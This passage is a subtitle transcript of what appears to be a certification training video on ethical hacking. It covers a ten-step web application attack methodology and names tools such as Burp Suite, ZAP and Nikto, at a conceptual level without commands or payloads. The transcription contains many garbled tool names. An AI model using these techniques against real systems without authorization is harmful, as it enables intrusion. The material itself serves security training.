00:40:21.540\n&gt;&gt; You saw it?\n\n813\n00:40:21.540 --> 00:40:22.830\nWell, I was here.\n\n814\n00:40:22.830 --> 00:40:25.988\nI had like 35 pieces lined up, and\nI went through, I was melting ice-cubes.\n\n815\n00:40:25.988 --> 00:40:29.408\nAnd listen, you did the whole\nPokemon thing, so I mean, you know,\n\n816\n00:40:29.408 --> 00:40:33.128\nmine is relatively benign, I'm not\nstopping or jumping out of the car and\n\n817\n00:40:33.128 --> 00:40:36.550\ngoing to find mythical creatures\nfrolicking in the woods, right?\n\n818\n00:40:36.550 --> 00:40:39.916\nAll I'm doing is melting a digital ice\ncube looking for a game piece, as things\n\n819\n00:40:39.916 --> 00:40:43.520\ngo, I'm the better adjusted of the two\nof us in case you didn't know that.\n\n820\n00:40:43.520 --> 00:40:46.920\nSo you go through,\nyou do all those things, and\n\n821\n00:40:46.920 --> 00:40:50.170\nthey're giving away literally Starbucks\nfor life, which is the grand prize.\n\n822\n00:40:50.170 --> 00:40:51.030\n&gt;&gt; Right.\n&gt;&gt; Maybe one person\n\n823\n00:40:51.030 --> 00:40:52.500\non the planet will win that.\n\n824\n00:40:52.500 --> 00:40:55.040\nBut they have Starbucks for\na month, Starbucks for a week,\n\n825\n00:40:55.040 --> 00:40:55.920\nStarbucks for a year,\n\n826\n00:40:55.920 --> 00:40:59.180\nthey're giving out different ranges of\nstuff which I thought was kind of cool.\n\n827\n00:40:59.180 --> 00:41:03.040\nAnd so I've been going in, and not anymore\nthan normal but I've been going in and\n\n828\n00:41:03.040 --> 00:41:07.490\nfeeding my habit right and getting my\nespresso, racking up my game pieces.\n\n829\n00:41:07.490 --> 00:41:09.450\nBut I actually, I made the mistake.\n\n830\n00:41:09.450 --> 00:41:10.830\nIt's always when I go\nthrough the drive-thru.\n\n831\n00:41:10.830 --> 00:41:12.200\nIf I get out of the car.\n\n832\n00:41:12.200 --> 00:41:15.740\nThis is the thing, if I'm lazy,\nthis is the universe telling me,\n\n833\n00:41:15.740 --> 00:41:16.921\nget up off of your ass, right?\n\n834\n00:41:16.921 --> 00:41:17.540\n&gt;&gt; [LAUGH] Yes.\n\n835\n00:41:17.540 --> 00:41:18.317\n&gt;&gt; You know, go walk in.\n\n836\n00:41:18.317 --> 00:41:21.325\nWhen I sit in the drive thru at that\nStarbucks, It never feels fails.\n\n837\n00:41:21.325 --> 00:41:21.830\n&gt;&gt; Uh-huh.\n\n838\n00:41:21.830 --> 00:41:25.210\n&gt;&gt; I'm stuck behind the person who\nis ordering for an entire office and\n\n839\n00:41:25.210 --> 00:41:28.520\neverybody has a ten,\n&gt;&gt; Yes.\n\n840\n00:41:28.520 --> 00:41:30.885\n&gt;&gt; Step process to their drink\nthat has to be followed.\n\n841\n00:41:30.885 --> 00:41:33.210\n&gt;&gt; Mm-hm.\n&gt;&gt; I sat for probably ten minutes.\n\n842\n00:41:33.210 --> 00:41:35.060\n&gt;&gt; Wow.\n&gt;&gt; Behind this woman in a minivan.\n\n843\n00:41:35.060 --> 00:41:37.820\nWho was getting, and\nwhen they handed it out,\n\n844\n00:41:37.820 --> 00:41:39.820\nit was not even like she got 1,000 drinks.\n\n845\n00:41:39.820 --> 00:41:43.020\nIt was 2 drinks and\nsome sort of food in a bag.\n\n846\n00:41:43.020 --> 00:41:47.260\nBut it's one of those, I call them\nfoo foo drinks, the mega foo foo\n\n847\n00:41:47.260 --> 00:41:52.130\ndrinks where you get the whipped cream and\nit's gotta be 125 degrees.\n\n848\n00:41:52.130 --> 00:41:54.280\nAnd just it drives me nuts.\n\n849\n00:41:54.280 --> 00:41:59.790\nSo either I have to find another\ncoffee outlet, or I have to just kill\n\n850\n00:41:59.790 --> 00:42:02.370\nall the people that get in front of me\nthat are stupid that just get in my way.\n\n851\n00:42:02.370 --> 00:42:03.470\nOne or the other.\n\n852\n00:42:03.470 --> 00:42:04.660\nSo yeah, I don't know.\n\n853\n00:42:04.660 --> 00:42:06.460\nI guess I'm gonna have\nto start going in now.\n\n854\n00:42:06.460 --> 00:42:07.440\n&gt;&gt; Go in.\n&gt;&gt; Because\n\n855\n00:42:07.440 --> 00:42:08.466\n&gt;&gt; Somebody's trying to execute\n\n856\n00:42:08.466 --> 00:42:09.910\na denial service attack against me,\n&gt;&gt; [LAUGH]\n\n857\n00:42:09.910 --> 00:42:11.980\n&gt;&gt; For coffee every time I get in line.\n\n858\n00:42:11.980 --> 00:42:13.280\nAnd the funny part is, when I go there,\n\n859\n00:42:13.280 --> 00:42:15.870\nobviously when I'm here with you\nguys I go there all the time.\n\n860\n00:42:15.870 --> 00:42:18.050\nI'm there probably maybe two,\nthree times a day.\n\n861\n00:42:18.050 --> 00:42:21.300\nI pull into the drive through and\nthey're like, hey Adam, welcome back.\n\n862\n00:42:21.300 --> 00:42:22.000\nWow, awesome.\n\n863\n00:42:22.000 --> 00:42:22.640\nDouble espresso?\n\n864\n00:42:22.640 --> 00:42:24.140\nAbsolutely, we'll see you at the window.\n\n865\n00:42:24.140 --> 00:42:26.691\nAnd that's a lie because it takes\n20 minutes to get up there.\n\n866\n00:42:26.691 --> 00:42:28.371\n&gt;&gt; [LAUGH]\n&gt;&gt; They know I'm there, right?\n\n867\n00:42:28.371 --> 00:42:29.620\n&gt;&gt; Yes.\n&gt;&gt; So they know it's me, but\n\n868\n00:42:29.620 --> 00:42:33.090\nthen the issue is the communication\nchannel between me and the window.\n\n869\n00:42:33.090 --> 00:42:34.360\nIs being blocked.\n\n870\n00:42:34.360 --> 00:42:34.860\n&gt;&gt; Yes.\n\n871\n00:42:35.950 --> 00:42:39.160\nMaybe you can get them to\ndo a little out of band.\n\n872\n00:42:39.160 --> 00:42:40.070\n&gt;&gt; They can break it out.\n\n873\n00:42:40.070 --> 00:42:43.700\n&gt;&gt; Run that espresso out to your car,\ncuz they know it's you.\n\n874\n00:42:43.700 --> 00:42:45.690\n&gt;&gt; That would require\nan investment of money,\n\n875\n00:42:45.690 --> 00:42:48.220\nI think,\nbeyond the initial investment of money.\n\n876\n00:42:48.220 --> 00:42:50.590\nOr you'd have to smile really nicely.\n\n877\n00:42:50.590 --> 00:42:51.950\nWait, do that thing again with your cup.\n\n878\n00:42:51.950 --> 00:42:52.535\n&gt;&gt; No, like this.\n\n879\n00:42:52.535 --> 00:42:54.554\n[NOISE]\n&gt;&gt; That might work.\n\n880\n00:42:54.554 --> 00:42:59.530\n&gt;&gt; It's almost like\nthe [LAUGH] crazy smile.\n\n881\n00:42:59.530 --> 00:43:01.570\nSheldon Cooper smile from Big Bang Theory.\n\n882\n00:43:01.570 --> 00:43:02.140\n&gt;&gt; Yes, uh-huh.\n\n883\n00:43:02.140 --> 00:43:04.482\n[CROSSTALK]\n&gt;&gt; Yeah, when he does one of those,\n\n884\n00:43:04.482 --> 00:43:06.383\nthat's truly scary right there.\n\n885\n00:43:06.383 --> 00:43:08.580\nAll right, so we have all these\ndifferent kinds of stacks.\n\n886\n00:43:08.580 --> 00:43:10.870\nWhat about web services XML poisoning?\n\n887\n00:43:10.870 --> 00:43:12.980\nRight?\nXML's one of the key carrier,\n\n888\n00:43:12.980 --> 00:43:15.980\nunderlying languages of everything\nwe do today, not just web searches.\n\n889\n00:43:15.980 --> 00:43:17.530\nBut certainly for web searches,\n\n890\n00:43:17.530 --> 00:43:19.850\nin particular,\nwe can assert malicious XML code.\n\n891\n00:43:19.850 --> 00:43:21.880\nForget about SQL injection attacks.\n\n892\n00:43:21.880 --> 00:43:25.034\nXML malicious code could be\nused to generate errors, and\n\n893\n00:43:25.034 --> 00:43:26.860\ndo all sorts of stuff.\n\n894\n00:43:26.860 --> 00:43:29.890\nAlmost everything we do today has\nan element of XML associated with it, so\n\n895\n00:43:29.890 --> 00:43:31.140\nwe've gotta be thinking about that.\n\n896\n00:43:32.290 --> 00:43:36.050\nObviously a bit of an issue,\nI know we have a little web\n\n897\n00:43:36.050 --> 00:43:40.150\napp hacking methodology that we\nhacked together, quote unquote.\n\n898\n00:43:40.150 --> 00:43:42.920\nAnd so we got a little ten step\nmethodology here we put together for you.\n\n899\n00:43:42.920 --> 00:43:45.760\nKeep in mind,\nwe talked about this before, always wanna\n\n900\n00:43:45.760 --> 00:43:49.030\ntry to be as crystal clear and\nas transparent as we can be with you guys.\n\n901\n00:43:49.030 --> 00:43:50.870\nWhenever we put together a list like this,\n\n902\n00:43:50.870 --> 00:43:54.820\ngive you an ordered set of steps\nthat we should think about and\n\n903\n00:43:54.820 --> 00:43:59.140\nexecute on and do, definitely something\nyou wanna think about paying attention to.\n\n904\n00:43:59.140 --> 00:44:02.320\nProbably a good idea to focus on that,\nmake sure you know that, and\n\n905\n00:44:02.320 --> 00:44:03.580\nare aware of that, right?\n\n906\n00:44:03.580 --> 00:44:07.040\nAs you prepare for the exam, good review\nmaterial for you, in other words.\n\n907\n00:44:07.040 --> 00:44:07.980\nRight?\nSo we've got\n\n908\n00:44:07.980 --> 00:44:11.810\nthings like footprinting the web\ninfrastructure, attacking web servers, so\n\n909\n00:44:11.810 --> 00:44:14.690\nlet's just go down here real quick and\nkinda think through the logic of some of\n\n910\n00:44:14.690 --> 00:44:16.900\nthe stuff and\njust make sure we're comfortable with it.\n\n911\n00:44:16.900 --> 00:44:19.240\nSo we think about footprint\nweb infrastructure, right?\n\n912\n00:44:19.240 --> 00:44:21.280\nWhat would be some of the things\nwe may wanna be doing there?\n\n913\n00:44:21.280 --> 00:44:23.970\nWe've been talking about footprinting\nin prior episodes, right?\n\n914\n00:44:23.970 --> 00:44:27.210\nSo footprint recon,\nthe whole hacking methodology in the front\n\n915\n00:44:27.210 --> 00:44:29.520\nsection of the course as we've\nbeen going through that.\n\n916\n00:44:29.520 --> 00:44:33.480\nHere, it would be specific to the web\nservers, we would be going out.\n\n917\n00:44:33.480 --> 00:44:36.070\nWe would be trying to figure\nout what are the directories,\n\n918\n00:44:36.070 --> 00:44:37.990\nwhat services are running,\n\n919\n00:44:37.990 --> 00:44:43.770\ncan we identify what kind of operating\nsystem and web server may be there?\n\n920\n00:44:43.770 --> 00:44:44.950\nIs there any hidden content?\n\n921\n00:44:44.950 --> 00:44:48.040\nSo we'll look at robot files and\nthings like that.\n\n922\n00:44:48.040 --> 00:44:52.130\nWe're gonna try to figure out what\nvulnerability or vulnerabilities exist and\n\n923\n00:44:52.130 --> 00:44:53.390\nidentify them.\n\n924\n00:44:53.390 --> 00:44:55.180\nAnd then map them, or flag them, so\n\n925\n00:44:55.180 --> 00:44:58.410\nthat we can obviously then use them\nin step two to follow up, right.\n\n926\n00:44:58.410 --> 00:45:01.600\nSo this will be the beginning\nof our thought process.\n\n927\n00:45:01.600 --> 00:45:06.220\nThings like server discovery can be done\nthrough Whois lookups, DNS interrogation,\n\n928\n00:45:06.220 --> 00:45:07.425\nport scanning.\n\n929\n00:45:07.425 --> 00:45:09.525\nWe've shown various things like this.\n\n930\n00:45:09.525 --> 00:45:11.635\nWe've shown you the Whois websites before.\n\n931\n00:45:11.635 --> 00:45:14.285\nWe've done some DNS querying,\nthings like that.\n\n932\n00:45:14.285 --> 00:45:17.280\nWe've gone out and\nshowed you how to use various programs.\n\n933\n00:45:17.280 --> 00:45:20.075\nZenmap the Windows port of\nNmap will be good here.\n\n934\n00:45:20.075 --> 00:45:21.850\nYou can do that for port scanning.\n\n935\n00:45:21.850 --> 00:45:22.950\nAnd we've been through a lot of this.\n\n936\n00:45:22.950 --> 00:45:26.250\nIn other episodes we've shown you\nhow to do a variety of these things.\n\n937\n00:45:26.250 --> 00:45:28.840\nWhat about server identification\nof banner grabbing, right?\n\n938\n00:45:28.840 --> 00:45:31.540\nWe may go in and to try and figure\nout what kind of website is running.\n\n939\n00:45:31.540 --> 00:45:33.560\nAnd whether or\nnot it's Microsoft or whether or\n\n940\n00:45:33.560 --> 00:45:36.460\nnot it is a pacheo linix web server.\n\n941\n00:45:36.460 --> 00:45:40.424\nI'm gonna show you how to do some banner\ngrabbing in the hands on demo that we're\n\n942\n00:45:40.424 --> 00:45:44.446\ngonna do in one of the other episodes, so\nyou're gonna wanna take a look at that,\n\n943\n00:45:44.446 --> 00:45:46.773\nkinda interesting we're\ndo that thru Linux.\n\n944\n00:45:46.773 --> 00:45:49.735\nSo that'll be kinda cool,\nwe can do that there.\n\n945\n00:45:49.735 --> 00:45:52.953\nWe can go and figure out whether or\nnot there are web app firewalls and\n\n946\n00:45:52.953 --> 00:45:56.230\nproxies running and potentially try\nto detect that and if there are,\n\n947\n00:45:56.230 --> 00:45:58.060\nmay get some information about that.\n\n948\n00:45:58.060 --> 00:46:00.760\nSo there's all these different\nways we could go through there.\n\n949\n00:46:00.760 --> 00:46:02.790\nRemember hidden content\ndirectories are always good.\n\n950\n00:46:02.790 --> 00:46:07.080\nWe can do the robots trick, which we\ntalked about, but we may just go in and\n\n951\n00:46:07.080 --> 00:46:11.340\nuse tools like Burp sweep which we've\ntalked about to do some automation and\n\n952\n00:46:11.340 --> 00:46:14.270\nhacking through the directories\ntrying to figure out what's there.\n\n953\n00:46:14.270 --> 00:46:18.320\nWeb spidering using burp suite would be\na good example of how to do that here.\n\n954\n00:46:18.320 --> 00:46:22.340\nThere's all these different ones that\nwe could do inside of item number one.\n\n955\n00:46:22.340 --> 00:46:23.730\nWhat about attacking web servers?\n\n956\n00:46:23.730 --> 00:46:24.810\nWhat are we gonna do there?\n\n957\n00:46:24.810 --> 00:46:26.090\nWell lots of different stuff, right?\n\n958\n00:46:26.090 --> 00:46:29.452\nObviously hacking web servers can take\non a variety of different mechanisms\n\n959\n00:46:29.452 --> 00:46:30.090\nand methods.\n\n960\n00:46:30.090 --> 00:46:33.160\nWe talked about this in\nthe hacking web server episode.\n\n961\n00:46:33.160 --> 00:46:35.400\nSo we went through a pretty\nthorough conversation there,\n\n962\n00:46:35.400 --> 00:46:39.380\ntalked a lot about tools talked\nabout Nessus, web inspect,\n\n963\n00:46:39.380 --> 00:46:41.840\nAcunetix, I think you\neven put that one up.\n\n964\n00:46:41.840 --> 00:46:43.355\nURL scan is a tool.\n\n965\n00:46:43.355 --> 00:46:47.340\nI'm gonna demo nick two for you in the\nepisode where we do a little hands on so\n\n966\n00:46:47.340 --> 00:46:50.120\nyou can see, again a Linux\nbased tool that can go in and\n\n967\n00:46:50.120 --> 00:46:53.570\ncan pull some information down\non the the web server, so\n\n968\n00:46:53.570 --> 00:46:57.380\nwe'll take a look at that and we'll see\nthe output file, use a little CAD action\n\n969\n00:46:57.380 --> 00:47:02.000\nto cap the output file from scan.txt and\ntake a look at nick two.\n\n970\n00:47:02.000 --> 00:47:06.550\nSee there are tools we'll take a look at\nthat we have either talked about or used.\n\n971\n00:47:06.550 --> 00:47:09.970\nWeb inspect's another tool that can\nidentify security vulnerabilities when you\n\n972\n00:47:09.970 --> 00:47:14.480\nrun it against web servers and web\napplications, so we may use that there.\n\n973\n00:47:14.480 --> 00:47:17.740\nWhat about step three there,\nanalyzing web apps, right?\n\n974\n00:47:17.740 --> 00:47:23.380\nSo, we're gonna go in, we're gonna look\nat server site functionality if we can.\n\n975\n00:47:23.380 --> 00:47:24.800\nServer site technologies.\n\n976\n00:47:24.800 --> 00:47:29.570\nTry to figure out the various attacks\nsurfaces that we could latch on to.\n\n977\n00:47:29.570 --> 00:47:33.310\nAre we using APIs that may or\nmay not lead to exposure.\n\n978\n00:47:33.310 --> 00:47:35.930\nSo we're gonna look at\nall sorts of stuffs.\n\n979\n00:47:35.930 --> 00:47:39.504\nWe may be priming for doing injection\nattacks here, so you wanna look at.\n\n980\n00:47:39.504 --> 00:47:43.414\nVarious input methods, probe a little bit,\ntest a little bit, see whether or\n\n981\n00:47:43.414 --> 00:47:45.322\nnot certain things do or don't work.\n\n982\n00:47:45.322 --> 00:47:47.250\nSo we may do server fingerprinting.\n\n983\n00:47:47.250 --> 00:47:50.869\nWe may try to dump erred pages and\nsee what's going on there we've talked\n\n984\n00:47:50.869 --> 00:47:53.744\na little bit about that.We\nmay examine session tokens.\n\n985\n00:47:53.744 --> 00:47:57.520\nLook in to see whether or not we can\nget any valuable insight there, or\n\n986\n00:47:57.520 --> 00:47:59.800\nsomething like http or\n\n987\n00:47:59.800 --> 00:48:04.260\nhttprint or whatever you wanna call it\nit's one p is a tool that we often use.\n\n988\n00:48:04.260 --> 00:48:07.890\nI'll be demonstrating that in the episode\nwith regards to how to do some of\n\n989\n00:48:07.890 --> 00:48:08.650\nthe hands on stuff.\n\n990\n00:48:08.650 --> 00:48:11.290\nSo, again you'll get a chance\nto see some of these tools.\n\n991\n00:48:11.290 --> 00:48:14.190\nBut just keep in mind that this is\nthe kind of thing that we would often\n\n992\n00:48:14.190 --> 00:48:14.830\nlook for.\n\n993\n00:48:14.830 --> 00:48:18.930\nDirectory Traversal Attacks Cross\nsite scripting as we said,\n\n994\n00:48:18.930 --> 00:48:21.770\nemail interaction a lot of\nwebsites let you submit emails, or\n\n995\n00:48:21.770 --> 00:48:24.320\nlet you submit comments\nhow's that handled.\n\n996\n00:48:24.320 --> 00:48:28.460\nIs there information leakage going on,\nhave we done the input validation\n\n997\n00:48:28.460 --> 00:48:31.430\nthe buffer overflow test,\nthe boundary checking.\n\n998\n00:48:31.430 --> 00:48:35.330\nWe can do all of this kind of stuff and\npotentially look at that there.\n\n999\n00:48:35.330 --> 00:48:40.170\nIn area four or step four we're talking\nabout attacking authentication mechanisms.\n\n1000\n00:48:40.170 --> 00:48:43.590\nSo this where we're gonna go in and\nprobably take advantage of\n\n1001\n00:48:43.590 --> 00:48:46.930\nbad implementation, or\nlack of proper oversight for\n\n1002\n00:48:46.930 --> 00:48:49.230\nimplementation with\nregards to authentication.\n\n1003\n00:48:49.230 --> 00:48:53.060\nWe may be able to do session attacks\nthings like session prediction,\n\n1004\n00:48:53.060 --> 00:48:55.630\nbrute forcing,\npoisoning we've talked about all these.\n\n1005\n00:48:55.630 --> 00:48:59.100\nPassword attacks if passwords are weak\nmay be able to brute force them.\n\n1006\n00:48:59.100 --> 00:49:01.330\nCookie exploitation we could do sniffing,\n\n1007\n00:49:01.330 --> 00:49:05.260\nreplay, poisoning here\nall sorts of stuff there.\n\n1008\n00:49:05.260 --> 00:49:10.230\nWe maybe able to predict usernames\nif they are relatively easy,\n\n1009\n00:49:10.230 --> 00:49:13.320\nwe may be able to gain an advantage\nthere although usernames are not usually\n\n1010\n00:49:13.320 --> 00:49:14.590\nthe hard ones to figure out.\n\n1011\n00:49:14.590 --> 00:49:15.950\nThat's usually pretty easy.\n\n1012\n00:49:15.950 --> 00:49:18.808\nIt's the passwords that typically for\nsmarter, a little bit harder.\n\n1013\n00:49:18.808 --> 00:49:21.840\nRemember on of the key things here,we\nbe using muiti-factor authentication to\n\n1014\n00:49:21.840 --> 00:49:24.466\nprevent this kind of a possible attack.\n\n1015\n00:49:24.466 --> 00:49:26.100\nSee here that's just some\nstuff to think about,\n\n1016\n00:49:26.100 --> 00:49:30.030\nbut we've talked about a lot\nabout password cracking software.\n\n1017\n00:49:30.030 --> 00:49:33.936\nAnd things of that nature that may be\nused or may be brought to bare here.\n\n1018\n00:49:33.936 --> 00:49:35.670\nPerhaps you wanna think about that.\n\n1019\n00:49:35.670 --> 00:49:39.280\nAttack authorization schemes about half\nway down through the list now, right.\n\n1020\n00:49:39.280 --> 00:49:41.740\nSo we could be looking at\nauthorization attacks.\n\n1021\n00:49:41.740 --> 00:49:45.510\nManipulating the HTTP request\nthat are going back and forth.\n\n1022\n00:49:45.510 --> 00:49:49.230\nWe could yeah be able to\neither manipulate post data or\n\n1023\n00:49:49.230 --> 00:49:53.740\nHTTP headers, or maybe query strings and\ncookies that could be manipulated here.\n\n1024\n00:49:53.740 --> 00:49:57.690\nWe made you perimeter tampering,\ntalk about these things already.\n\n1025\n00:49:57.690 --> 00:50:02.690\nURI, uniform resource identifiers\ncould be manipulated as well.\n\n1026\n00:50:02.690 --> 00:50:04.410\nA lot of this is done with query strings,\nright?\n\n1027\n00:50:04.410 --> 00:50:08.820\nSo now we're getting into the query code\nthat can bypass authentication mechanisms,\n\n1028\n00:50:08.820 --> 00:50:12.980\nthat can be used essentially to be\nable to manipulate what's going on.\n\n1029\n00:50:12.980 --> 00:50:14.620\nSo, you keep that in mind.\n\n1030\n00:50:14.620 --> 00:50:19.540\nI showed you when we did a demo with the\nOWASP Zed Attack Proxy, the ZAP product.\n\n1031\n00:50:19.540 --> 00:50:20.730\nAnd that can, as you saw,\n\n1032\n00:50:20.730 --> 00:50:24.670\nbe used for things like man-in-the-middle\nattacks through the proxy,\n\n1033\n00:50:24.670 --> 00:50:28.660\nwhere we do the manipulation of the get\nrequest and we change the URLs.\n\n1034\n00:50:28.660 --> 00:50:31.070\nWe could use that for\ncookie parameter tampering as well.\n\n1035\n00:50:31.070 --> 00:50:32.630\nIt's a very powerful\ntool as you pointed out.\n\n1036\n00:50:32.630 --> 00:50:33.830\n&gt;&gt; Yes it is.\n&gt;&gt; And said you know hey\n\n1037\n00:50:33.830 --> 00:50:36.600\nwhy would they release a tool\nthat does all this crazy stuff?\n\n1038\n00:50:36.600 --> 00:50:39.470\n&gt;&gt; Yeah. [LAUGH] &gt;&gt; But you know obviously\nit's a pretty cool tool you just got to\n\n1039\n00:50:39.470 --> 00:50:40.400\nunderstand it.\n\n1040\n00:50:40.400 --> 00:50:41.970\nWe could go in and\n\n1041\n00:50:41.970 --> 00:50:45.450\nwe could take a look at session management\nmechanism attacks in number six.\n\n1042\n00:50:45.450 --> 00:50:49.930\nSo we can go in and look at session token\ngeneration and how tokens are generated,\n\n1043\n00:50:49.930 --> 00:50:51.290\nmanipulation of that.\n\n1044\n00:50:51.290 --> 00:50:54.162\nSo prediction and tampering would\nbe the ways we would go there.\n\n1045\n00:50:54.162 --> 00:50:55.719\nSession token handling,\n\n1046\n00:50:55.719 --> 00:50:59.160\nwe've talked a lot about man in\nthe middle,session replays hijacking.\n\n1047\n00:50:59.160 --> 00:51:03.680\nI've demonstrated a lot of this attacks in\nvarious ways areas of our conversations.\n\n1048\n00:51:03.680 --> 00:51:07.129\nSo these will be things to\nbe worried about there.\n\n1049\n00:51:07.129 --> 00:51:11.669\nWe may be looking at or should look\nat in performing injection attacks.\n\n1050\n00:51:11.669 --> 00:51:15.760\nAll the different ways we would injection,\nand validation attacks.\n\n1051\n00:51:15.760 --> 00:51:18.930\nWe're gonna do in our discussion\non SQL injections, and\n\n1052\n00:51:18.930 --> 00:51:20.670\nencourage you to look at that episode.\n\n1053\n00:51:20.670 --> 00:51:22.030\nWe go through this at a high level,\n\n1054\n00:51:22.030 --> 00:51:24.960\nwe do a little Shawn tell demo\non some SQL injection code.\n\n1055\n00:51:24.960 --> 00:51:26.800\nSo that's gonna be interesting.\n\n1056\n00:51:26.800 --> 00:51:29.830\nWeb scripts can be used for injection.\n\n1057\n00:51:29.830 --> 00:51:33.310\nWe talked about LDAP injection,\ntalked about buffer overflows,\n\n1058\n00:51:33.310 --> 00:51:36.670\nSQL injection, OS command injection.\n\n1059\n00:51:36.670 --> 00:51:38.810\nI think, I don't know if I\nmentioned SMTP injection.\n\n1060\n00:51:38.810 --> 00:51:42.179\nWe can manipulate the SMTP stack for\nmail back and forth.\n\n1061\n00:51:43.410 --> 00:51:46.500\nX path injection where\nwe do x path queries for\n\n1062\n00:51:46.500 --> 00:51:48.220\ncertain kinds of application logic.\n\n1063\n00:51:48.220 --> 00:51:50.440\nJust about anything you can\nthink of can be done here right.\n\n1064\n00:51:50.440 --> 00:51:55.320\nSo here's a long laundry list of\ninjection attacks that we may be able to\n\n1065\n00:51:55.320 --> 00:51:58.010\nDeal with in some way or\nmanipulate a news.\n\n1066\n00:51:58.010 --> 00:52:00.610\nAnd what about attacking data\nconnectivity's moved down towards\n\n1067\n00:52:00.610 --> 00:52:01.820\nthe bottom of that list.\n\n1068\n00:52:01.820 --> 00:52:05.340\nRight, we can go in and\nwe can look at different ways,\n\n1069\n00:52:05.340 --> 00:52:10.290\nwhich we may be able to manipulate\nthe information going back and forth.\n\n1070\n00:52:10.290 --> 00:52:14.480\nSo, things such as a connection\nstring injection Will be good here.\n\n1071\n00:52:15.610 --> 00:52:18.950\nWe can do either denial\nof service attacks or\n\n1072\n00:52:18.950 --> 00:52:21.490\nscripted denial of service attacks\nagainst the connection pool.\n\n1073\n00:52:21.490 --> 00:52:25.780\nSo trying to manipulate and\ntake over and crash the web app pool or\n\n1074\n00:52:25.780 --> 00:52:29.410\nthings like that, that are running,\nto knock the system offline.\n\n1075\n00:52:29.410 --> 00:52:32.000\nThere's a lot of ways we\ncould execute attacks here.\n\n1076\n00:52:32.000 --> 00:52:34.650\nCommand injection is one\nof the key things we do.\n\n1077\n00:52:34.650 --> 00:52:38.640\nWe may do connection string parameter\npollution attacks, what are called CSPP\n\n1078\n00:52:38.640 --> 00:52:43.210\nattacks, where we can go in overwrite\nparameter values in the connection string,\n\n1079\n00:52:43.210 --> 00:52:47.670\nmodifying things like hashes, and sorts\nof stuff that could then be compromised.\n\n1080\n00:52:47.670 --> 00:52:50.110\nSo we may do port scanning\nto figure this out.\n\n1081\n00:52:50.110 --> 00:52:54.685\nWe may be web credential hijacking, lots\nof different ways to execute that there.\n\n1082\n00:52:54.685 --> 00:52:55.901\nWhat about going in and\n\n1083\n00:52:55.901 --> 00:52:59.235\ntalked about web app client\nattacks down towards the bottom.\n\n1084\n00:53:00.395 --> 00:53:02.615\nThis is where we can go in and\n\n1085\n00:53:02.615 --> 00:53:05.345\nthings like cross-site scripting\ntakes place here certainly.\n\n1086\n00:53:05.345 --> 00:53:08.335\nThese are, in other words, going to\nbe either browser based attacks or\n\n1087\n00:53:08.335 --> 00:53:10.140\nweb applications that we're using.\n\n1088\n00:53:10.140 --> 00:53:11.740\nAttacking the application or\n\n1089\n00:53:11.740 --> 00:53:13.970\nattacking through the application\nif you think about that.\n\n1090\n00:53:13.970 --> 00:53:18.780\nSo, this is a cross site scripting,\nredirection attacks of using Microsoft,\n\n1091\n00:53:18.780 --> 00:53:23.650\nsome Microsoft's code based, ActiveX based\nattacks, session fixation, frame inject.\n\n1092\n00:53:23.650 --> 00:53:25.110\nWe talked about a lot of this already.\n\n1093\n00:53:25.110 --> 00:53:28.800\nThese are the kind of things that would\nwork and to potentially be found there.\n\n1094\n00:53:28.800 --> 00:53:31.880\nWhat about attacking web services an oldy,\nbut a goody and\n\n1095\n00:53:31.880 --> 00:53:35.340\ncertainly not least by any means\non the list although it is last.\n\n1096\n00:53:35.340 --> 00:53:40.710\nSo we could go in and we could attack\nwhether it is the .netFramework or\n\n1097\n00:53:40.710 --> 00:53:41.969\nJava let's say.\n\n1098\n00:53:43.280 --> 00:53:47.430\nWhether it is a weakness in some\nsort of the web service client so\n\n1099\n00:53:47.430 --> 00:53:49.280\ninjections upfront.\n\n1100\n00:53:49.280 --> 00:53:53.760\nMaybe there is on the back end,\ndata league get to the database system.\n\n1101\n00:53:53.760 --> 00:53:56.670\nAny of these areas that are combined\nin the architecture, any or\n\n1102\n00:53:56.670 --> 00:53:59.620\nall of them when we attacked\nthe business logic and we're looking for\n\n1103\n00:53:59.620 --> 00:54:02.360\nvulnerabilities can't\npotentially be an issue.\n\n1104\n00:54:02.360 --> 00:54:06.110\nWe do probing to try to figure out what\nthat issue and that concern may be,\n\n1105\n00:54:06.110 --> 00:54:08.340\nand then we take advantage\nof it essentially.\n\n1106\n00:54:08.340 --> 00:54:10.020\nAnd that's really what\nwe're looking to do.\n\n1107\n00:54:10.020 --> 00:54:13.270\nSOAP injection attacks are becoming\na lot more popular and\n\n1108\n00:54:13.270 --> 00:54:16.190\nso this is one of the things,\none of the areas that we see a lot of.\n\n1109\n00:54:16.190 --> 00:54:18.750\nWe've mentioned Burp Suite as one\nof the tools that you could use.\n\n1110\n00:54:18.750 --> 00:54:20.549\nI kind of rattled off some\ntools as we were going.\n\n1111\n00:54:21.720 --> 00:54:24.970\nBut just hit a couple of\nthe highlights for cookie attacks.\n\n1112\n00:54:24.970 --> 00:54:26.580\nCookieDigger is a tool.\n\n1113\n00:54:26.580 --> 00:54:27.670\nIt's a Foundstone tool.\n\n1114\n00:54:27.670 --> 00:54:28.170\n&gt;&gt; Yeah?\n&gt;&gt; Right.\n\n1115\n00:54:28.170 --> 00:54:30.370\nRemember we talked about Foundstone.\n\n1116\n00:54:30.370 --> 00:54:31.420\nSo you're there.\n\n1117\n00:54:31.420 --> 00:54:32.930\nThere tools are kinda cool.\n\n1118\n00:54:34.060 --> 00:54:37.010\nThere's Web scarab which\nis a hacking tool for\n\n1119\n00:54:37.010 --> 00:54:40.180\nweb analyzing applications and\nweb vulnerabilities.\n\n1120\n00:54:40.180 --> 00:54:41.550\nSo that may be a good one.\n\n1121\n00:54:41.550 --> 00:54:47.060\nThere's HTTP B there is web copier,\nthere's W3AF which we will actually demo.\n\n1122\n00:54:47.060 --> 00:54:49.330\nI will use At least talk about it.\n\n1123\n00:54:49.330 --> 00:54:50.430\nSo we'll take a look at that.\n\n1124\n00:54:50.430 --> 00:54:52.330\nThere's BlackWidow,\ngotta love that one, right?\n\n1125\n00:54:52.330 --> 00:54:53.102\n&gt;&gt; Yes.\n[LAUGH]\n\n1126\n00:54:53.102 --> 00:54:53.971\n&gt;&gt; That's a good one.\n\n1127\n00:54:53.971 --> 00:54:55.652\nThere's cURL, but it's small c URL.\n\n1128\n00:54:55.652 --> 00:54:56.760\n&gt;&gt; Yep.\n&gt;&gt; It's a c-U-R-L.\n\n1129\n00:54:56.760 --> 00:54:58.250\nRight?\nSo there's lot of different ones there\n\n1130\n00:54:58.250 --> 00:55:01.160\nthat you just may want to be aware of and\nyou'll obviously be thinking about.\n\n1131\n00:55:01.160 --> 00:55:04.270\nWith regards to counter measures,\nwe sprinkle them in 